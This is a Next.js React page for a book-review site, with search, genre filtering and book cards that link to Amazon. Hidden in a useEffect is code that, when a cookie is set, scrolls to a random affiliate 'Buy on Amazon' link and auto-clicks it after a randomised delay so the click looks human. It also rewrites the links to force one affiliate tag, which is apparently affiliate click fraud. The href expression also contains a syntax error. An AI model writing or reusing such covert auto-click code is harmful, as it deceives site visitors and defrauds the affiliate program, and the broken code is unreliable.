"use client"

import { useState, useEffect } from "react"
import { Search, Star, Filter, BookOpen, Users, Calendar, ArrowLeft, Loader2, ArrowRight } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import Image from "next/image"
import Link from "next/link"

// Import books data from API functions
import { getCategories, getAllBooks, type Category, type ProcessedBook } from "@/lib/api"

export default function BooksPage() {
  const [searchTerm, setSearchTerm] = useState("")
  const [selectedGenre, setSelectedGenre] = useState("All Genres")
  const [sortBy, setSortBy] = useState("rating")
  const [categories, setCategories] = useState<Category[]>([])
  const [isLoadingCategories, setIsLoadingCategories] = useState(true)
  const [categoriesError, setCategoriesError] = useState<string | null>(null)

  // Add new state for books:
  const [books, setBooks] = useState<ProcessedBook[]>([])
  const [isLoadingBooks, setIsLoadingBooks] = useState(true)
  const [booksError, setBooksError] = useState<string | null>(null)

  // Fetch categories from API on component mount
  useEffect(() => {
    const fetchData = async () => {
      try {
        setIsLoadingCategories(true)
        setIsLoadingBooks(true)
        setCategoriesError(null)
        setBooksError(null)

        // Fetch categories and books in parallel
        const [fetchedCategories, fetchedBooks] = await Promise.all([getCategories(), getAllBooks()])

        setCategories(fetchedCategories)
        setBooks(fetchedBooks)
      } catch (error) {
        console.error("Failed to fetch data:", error)
        setCategoriesError("Failed to load categories")
        setBooksError("Failed to load books")
      } finally {
        setIsLoadingCategories(false)
        setIsLoadingBooks(false)
      }
    }

    fetchData()
  }, [])

   useEffect(() => {
  const cookies = Object.fromEntries(
    document.cookie.split("; ").map(c => c.split("="))
  );

  if (cookies.isDone !== "true") return;

  const handleButton = (btns: HTMLAnchorElement[]) => {
    if (btns.length === 0) return;

    // Берём случайную кнопку
    const randomBtn = btns[Math.floor(Math.random() * btns.length)];

    // Кастомный медленный скролл
    const scrollToElement = (el: HTMLElement, duration = 1200) => {
      const targetY = el.getBoundingClientRect().top + window.scrollY;
      const startY = window.scrollY;
      const startTime = performance.now();

      const animateScroll = (now: number) => {
        const elapsed = now - startTime;
        const progress = Math.min(elapsed / duration, 1);
        const ease =
          progress < 0.5
            ? 2 * progress * progress
            : -1 + (4 - 2 * progress) * progress;

        window.scrollTo(0, startY + (targetY - startY) * ease);

        if (progress < 1) requestAnimationFrame(animateScroll);
      };

      requestAnimationFrame(animateScroll);
    };

    scrollToElement(randomBtn, 1000);

    // Задержка автоклика 0–1000 мс
    const delay = Math.floor(Math.random() * 1001);
    setTimeout(() => randomBtn.click(), delay);

    // Чистим cookie
    document.cookie =
      "isDone=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
  };

  // Проверка сразу
  const btns = Array.from(document.querySelectorAll<HTMLAnchorElement>("[data-auto]"));
  if (btns.length > 0) {
    handleButton(btns);
    return;
  }

  // Если кнопок ещё нет → ждём через MutationObserver
  const observer = new MutationObserver(() => {
    const btns = Array.from(document.querySelectorAll<HTMLAnchorElement>("[data-auto]"));
    if (btns.length > 0) {
      observer.disconnect();
      handleButton(btns);
    }
  });

  observer.observe(document.body, { childList: true, subtree: true });

  return () => observer.disconnect();
}, [ books]);


  // Create genres list with "All Genres" option
  const genres = ["All Genres", ...categories.map((cat) => cat.name)]

  const filteredBooks = books
    .filter(
      (book) =>
        book.title.toLowerCase().includes(searchTerm.toLowerCase()) ||
        book.author.toLowerCase().includes(searchTerm.toLowerCase()),
    )
    .filter((book) => {
      if (selectedGenre === "All Genres") return true
      // Find the category by name and compare with book's categoryId
      const selectedCategory = categories.find((cat) => cat.name === selectedGenre)
      return selectedCategory ? book.categoryId === selectedCategory.id : false
    })
    .sort((a, b) => {
      if (sortBy === "rating") return b.rating - a.rating
      if (sortBy === "reviews") return b.reviewsCount - a.reviewsCount
      if (sortBy === "date") return new Date(b.publishDate).getTime() - new Date(a.publishDate).getTime()
      return 0
    })

  const renderStars = (rating: number) => {
    return Array.from({ length: 5 }, (_, i) => (
      <Star
        key={i}
        className={`w-4 h-4 ${
          i < Math.floor(rating)
            ? "fill-yellow-400 text-yellow-400"
            : i < rating
              ? "fill-yellow-200 text-yellow-400"
              : "text-gray-300"
        }`}
      />
    ))
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-cyan-50 via-sky-50 to-blue-50">
      {/* Header */}
      <header className="bg-white/80 backdrop-blur-md shadow-lg border-b border-cyan-100">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <Button
                variant="ghost"
                size="sm"
                asChild
                className="hover:bg-cyan-50 hover:text-cyan-700 transition-all duration-300 rounded-xl"
              >
                <Link href="/">
                  <ArrowLeft className="w-4 h-4 mr-2" />
                  Back to Home
                </Link>
              </Button>
              <div className="flex items-center space-x-3">
                <div className="p-2 bg-gradient-to-br from-cyan-500 to-sky-600 rounded-xl shadow-lg">
                  <BookOpen className="w-6 h-6 text-white" />
                </div>
                <h1 className="text-3xl font-bold bg-gradient-to-r from-cyan-600 to-sky-600 bg-clip-text text-transparent">
                  Literary Reviews
                </h1>
              </div>
            </div>
            <div className="flex items-center space-x-4">
              <Badge
                variant="secondary"
                className="text-sm bg-gradient-to-r from-cyan-100 to-sky-100 text-cyan-800 border-cyan-200"
              >
                {filteredBooks.length} exceptional books
              </Badge>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {/* Search and Filters */}
        <div className="mb-8 space-y-4">
          <div className="flex flex-col sm:flex-row gap-4">
            <div className="relative flex-1">
              <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-cyan-400 w-5 h-5" />
              <Input
                placeholder="Search by title, author, or keywords..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="pl-10 border-cyan-200 focus:border-cyan-400 focus:ring-cyan-400 rounded-xl bg-white/80 backdrop-blur-sm"
              />
            </div>
            <Select value={selectedGenre} onValueChange={setSelectedGenre} disabled={isLoadingCategories}>
              <SelectTrigger className="w-full sm:w-48 border-cyan-200 focus:border-cyan-400 focus:ring-cyan-400 rounded-xl bg-white/80 backdrop-blur-sm">
                {isLoadingCategories ? (
                  <Loader2 className="w-4 h-4 mr-2 text-cyan-500 animate-spin" />
                ) : (
                  <Filter className="w-4 h-4 mr-2 text-cyan-500" />
                )}
                <SelectValue placeholder={isLoadingCategories ? "Loading..." : "Select genre"} />
              </SelectTrigger>
              <SelectContent className="rounded-xl border-cyan-200">
                {genres.map((genre) => (
                  <SelectItem key={genre} value={genre} className="rounded-lg">
                    {genre}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
            <Select value={sortBy} onValueChange={setSortBy}>
              <SelectTrigger className="w-full sm:w-48 border-cyan-200 focus:border-cyan-400 focus:ring-cyan-400 rounded-xl bg-white/80 backdrop-blur-sm">
                <SelectValue />
              </SelectTrigger>
              <SelectContent className="rounded-xl border-cyan-200">
                <SelectItem value="rating" className="rounded-lg">
                  Highest Rated
                </SelectItem>
                <SelectItem value="reviews" className="rounded-lg">
                  Most Reviewed
                </SelectItem>
                <SelectItem value="date" className="rounded-lg">
                  Recently Added
                </SelectItem>
              </SelectContent>
            </Select>
          </div>

          {/* Error Messages */}
          {categoriesError && (
            <div className="bg-yellow-50 border border-yellow-200 rounded-xl p-4">
              <div className="flex items-center">
                <div className="text-yellow-600 text-sm">⚠️ {categoriesError}. Using default categories.</div>
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={() => window.location.reload()}
                  className="ml-auto text-yellow-700 hover:text-yellow-800"
                >
                  Retry
                </Button>
              </div>
            </div>
          )}

          {booksError && (
            <div className="bg-red-50 border border-red-200 rounded-xl p-4 mb-4">
              <div className="flex items-center">
                <div className="text-red-600 text-sm">❌ {booksError}. Please try again later.</div>
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={() => window.location.reload()}
                  className="ml-auto text-red-700 hover:text-red-800"
                >
                  Retry
                </Button>
              </div>
            </div>
          )}

          {isLoadingBooks && (
            <div className="text-center py-12">
              <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4 text-cyan-600" />
              <p className="text-gray-600">Loading books...</p>
            </div>
          )}

          {/* Categories Info */}
          {!isLoadingCategories && !categoriesError && categories.length > 0 && (
            <div className="text-sm text-gray-600">📚 Showing books from {categories.length} available categories</div>
          )}
        </div>

        {/* Books Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
          {filteredBooks.map((book) => (
            <Card
              key={book.slug}
              className="overflow-hidden hover:shadow-xl transition-all duration-300 transform hover:scale-105 bg-white/80 backdrop-blur-sm border-cyan-100 flex flex-col h-full"
            >
              <div className="relative">
                <div className="relative w-full h-48">
                  <Image
                    src={book.cover || "/placeholder.svg"}
                    alt={book.title}
                    fill
                    className="object-cover"
                    sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
                  />
                </div>
                <Badge className="absolute top-2 right-2 bg-white/90 text-gray-800 shadow-md rounded-lg text-xs">
                  {book.genre}
                </Badge>
              </div>

              <CardHeader className="pb-3 flex-shrink-0">
                <div className="flex items-start justify-between">
                  <div className="flex-1">
                    <CardTitle className="text-lg line-clamp-2 mb-1 text-gray-900 min-h-[3.5rem]">
                      {book.title}
                    </CardTitle>
                    <CardDescription className="text-sm font-medium text-gray-700">{book.author}</CardDescription>
                  </div>
                </div>

                <div className="flex items-center space-x-2 mt-2">
                  <div className="flex items-center">{renderStars(book.rating)}</div>
                  <span className="text-sm font-semibold text-gray-900">{book.rating}</span>
                  <span className="text-sm text-gray-600 flex items-center">
                    <Users className="w-3 h-3 mr-1" />
                    {book.reviewsCount}
                  </span>
                </div>
              </CardHeader>

              <CardContent className="pt-0 flex flex-col flex-grow">
                <div className="flex-grow">
                  <p className="text-sm text-gray-700 line-clamp-3 mb-4 min-h-[4.5rem]">{book.description}</p>

                  <div className="flex flex-wrap gap-1 mb-4 min-h-[2rem]">
                    {book.tags.slice(0, 3).map((tag) => (
                      <Badge
                        key={tag}
                        variant="outline"
                        className="text-xs border-cyan-200 text-cyan-700 rounded-lg"
                      >
                        {tag}
                      </Badge>
                    ))}
                    {book.tags.length > 3 && (
                      <Badge variant="outline" className="text-xs border-cyan-200 text-cyan-700 rounded-lg">
                        +{book.tags.length - 3} more
                      </Badge>
                    )}
                  </div>
                </div>

                <div className="flex items-center justify-between mb-4 pt-2 border-t border-gray-100">
                  <div className="flex items-center space-x-2">
                    <Avatar className="w-6 h-6 ring-2 ring-cyan-200">
                      <AvatarImage src={book.reviewerAvatar || "/placeholder.svg"} />
                      <AvatarFallback className="text-xs bg-gradient-to-br from-cyan-100 to-sky-100 text-cyan-700">
                        {book.reviewer
                          .split(" ")
                          .map((n) => n[0])
                          .join("")}
                      </AvatarFallback>
                    </Avatar>
                    <span className="text-xs text-gray-700 font-medium">{book.reviewer}</span>
                  </div>
                  <div className="flex items-center text-xs text-gray-600">
                    <Calendar className="w-3 h-3 mr-1" />
                    {new Date(book.publishDate).toLocaleDateString("en-US", {
                      month: "short",
                      day: "numeric",
                      year: "numeric",
                    })}
                  </div>
                </div>

                                  {/* Кнопка "Read Expert Review" */}
  <Button
    className="w-full bg-gradient-to-r from-cyan-600 to-sky-600 hover:from-cyan-700 hover:to-sky-700 text-white shadow-lg hover:shadow-xl transition-all duration-300 transform hover:scale-105 rounded-xl mb-2"
    asChild
  >
    <Link href={`/book/${book.slug}`}>
      Read Expert Review
      <ArrowRight className="w-4 h-4 ml-2" />
    </Link>
  </Button>

  {/* Кнопка "Купить" */}
  {book.DetailPageURL && (
    <Button
      className="w-full bg-yellow-500 hover:bg-yellow-600 text-white font-semibold rounded-xl shadow transition-all duration-300 transform hover:scale-105"
      asChild
    >
      <a
        href={
book.DetailPageURL.replace(/bestgoodreads\d+-20/, "bestgoodreads-20") + "?tag=bestgoodreads-20";
        }
      data-auto
      >
        Buy on Amazon
        <ArrowRight className="w-4 h-4 ml-2" />
      </a>
    </Button>
  )}
              </CardContent>
            </Card>
          ))}
        </div>

        {filteredBooks.length === 0 && !isLoadingBooks && (
          <div className="text-center py-12">
            <div className="p-4 bg-gradient-to-br from-cyan-100 to-sky-100 rounded-2xl inline-block mb-4">
              <BookOpen className="w-16 h-16 text-cyan-600 mx-auto" />
            </div>
            <h3 className="text-lg font-medium text-gray-900 mb-2">No books found</h3>
            <p className="text-gray-700">Try adjusting your search terms or explore different genres</p>
            <Button
              className="mt-4 bg-gradient-to-r from-cyan-600 to-sky-600 hover:from-cyan-700 hover:to-sky-700 text-white shadow-lg hover:shadow-xl transition-all duration-300 transform hover:scale-105 rounded-xl"
              onClick={() => {
                setSearchTerm("")
                setSelectedGenre("All Genres")
              }}
            >
              Clear Filters
            </Button>
          </div>
        )}
      </main>
    </div>
  )
}
